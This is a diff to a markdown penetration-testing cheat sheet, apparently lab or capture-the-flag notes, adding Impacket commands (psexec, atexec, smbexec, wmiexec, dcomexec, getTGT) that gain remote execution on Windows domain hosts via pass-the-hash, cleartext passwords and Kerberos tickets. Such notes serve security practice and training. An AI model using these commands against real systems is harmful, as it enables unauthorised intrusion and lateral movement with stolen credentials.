@@ -4299,6 +4299,29 @@ gpupdate /force
 ## impacket 
 
 ```
+# Impacket auth with hash , kerberos, pass ( missing aesKey , keytab )
+impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+impacket-psexec DVR4/Administrator:'14WatchD0g$'@192.168.118.179
+impacket-psexec -k -no-pass sub.poseidon.yzx/Administrator@dc01.poseidon.yzx
+or
+impacket-atexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+impacket-atexec DVR4/Administrator:'14WatchD0g$'@192.168.118.179
+impacket-atexec -k -no-pass sub.poseidon.yzx/Administrator@dc01.poseidon.yzx
+or
+impacket-smbexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+impacket-smbexec DVR4/Administrator:'14WatchD0g$'@192.168.118.179
+impacket-smbexec -k -no-pass sub.poseidon.yzx/Administrator@dc01.poseidon.yzx
+or
+impacket-wmiexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+impacket-wmiexec DVR4/Administrator:'14WatchD0g$'@192.168.118.179
+impacket-wmiexec -k -no-pass sub.poseidon.yzx/Administrator@dc01.poseidon.yzx
+or
+impacket-dcomexec corp.com/jen:'Password123!'@192.168.50.73 -object MMC20
+impacket-dcomexec corp.com/jen:'Password123!'@192.168.50.73 -object ShellWindows
+impacket-dcomexec corp.com/jen:'Password123!'@192.168.50.73 -object ShellBrowserWindow
+
+
+
 # auth with kerberoas in AD   ( when NTLM disable , STATUS_NOT_SUPPORTED , NTLM:False when run nxc smb)
 impacket-getTGT voleur.htb/svc_winrm -dc-ip 10.10.11.76       (Saving ticket in svc_winrm.ccache)
 or
